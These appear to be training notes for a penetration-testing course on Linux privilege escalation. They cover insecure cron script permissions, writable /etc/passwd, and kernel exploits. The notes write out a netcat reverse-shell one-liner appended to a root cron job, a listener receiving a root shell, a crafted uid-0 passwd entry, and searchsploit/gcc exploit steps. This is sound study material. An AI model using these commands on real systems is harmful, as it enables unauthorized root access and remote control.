
Because everything in Linux is a file, most privesc revolves around _insecure file permissions_ or _kernel exploits_.  
  
_THAT_ being said... highly rec [https://gtfobins.github.io/](https://gtfobins.github.io/)  
  
Can search for binaries w/ SUID or GUID bits set, and then search ^ url for possible vulns w/ said binary. (Check #4 of [Linux Privesc exercises](18%20-%20Linux%20Privesc.md#18.3.5.4))



### Insecure File Permissions:

Must locate an executable that not only allows us write access but also runs at an elevated privilege level.  
  
Cron is a prime target, as system-level scheduled jobs are executed with root user privileges  
& sysadmins often create scripts for cron jobs with insecure perms.  
  
  
Search for installed cron jobs:  
```bash
ls -lah /etc/cron*  
  
OR
  
grep "CRON" /var/log/cron.log  
Jan27 15:55:26 victim cron[719]: (CRON) INFO (pidfile fd = 3)  
Jan27 15:55:26 victim cron[719]: (CRON) INFO (Running @reboot jobs)  
...  
Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
```

**cat**'ing the script shows it copies the student's home dir to the backups subdir  
AND looking at the file shows that not only can anyone can Read/Write to it, BUT it's also executed in the context of the _**root**_ user:  
```bash
#!/bin/bash  
  
cp -rf /home/student/ /var/backups/student/  
  
  
ls -lah /var/scripts/user_backups.sh   
-rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh
```

Meaning, we can edit the script and add a reverse shell one-liner which then executes as root.:  
```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f" >> user_backups.sh
```

starting up a **nc** listener on the attack machine & waiting for the cron script to run (check timestamps for how often the cronjob runs) will eventually net a reverse shell w/ root perms:  
```bash
nc -lnvp 1234  
  listening on [any] 1234 ...  
  connect to [10.11.0.4] from (UNKNOWN) [10.11.0.128] 43172  
  /bin/sh: 0: can''t access tty; job control turned off  
  # whoami  
  root  
  # 
```



### /etc/passwd

Unless AD or LDAP is used, Linux passwords are stored in /etc/shadow (not readable by normal users)  
  
Because historically, passwords _were_ stored in /etc/passwd, for backwards compatibility,  
	if there's a password hash present in the 2nd column, it's considered valid **& takes precedence over its respective entry in /etc/shadow**  
  
  
Granted, we have to have write perms for /etc/passwd in the first place ----- Most likely not.  
  
But if we can write to /etc/passwd, we can craft a new user & add it w/ root privileges:  
```bash
student@debian:~$ openssl passwd evil  
AK24fcSx2Il3I  
  
student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd  
  
student@debian:~$ su root2  
Password: evil  
  
root@debian:/home/student# id  
uid=0(root) gid=0(root) groups=0(root)
```
adding entries:  
	username : pw hash : UID : GID : UID info (comment field) : home directory : command/shell  
	- 0 values for UID & GID specify the account is a superuser account  



### Kernel Vulns:

Success depends on matching the target's kernel version AND the OS flavor (Debian, Redhat, Suse, etc)  
  
First gather info about the target:  
```bash
cat /etc/issue  
Ubuntu 16.04.3 LTS \n \l
```

Inspect kernel version & system architecture:  
```bash
uname -r  
4.8.0-58-generic  
arch  
x86_64
```
	- Kernel version  
	- Architecture  
  
Search for exploits:  
```bash
searchsploit linux kernel ubuntu 16.04  
-------------------------------------------------------- -----------------------------  
 Exploit Title                                          |  Path (/usr/share/exploitdb/  
-------------------------------------------------------- -----------------------------  
...  
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.0 | exploits/linux/local/43418.c
```
	-- Same kernel version target's running  
  
Similar to Windows - we'll use **gcc** to compile the exploit to run on Linux:  
**NOTE: extremely important we compile on a computer w/ the same architecture  
```bash
gcc 43418.c -o exploit
```
  
Copy to target & run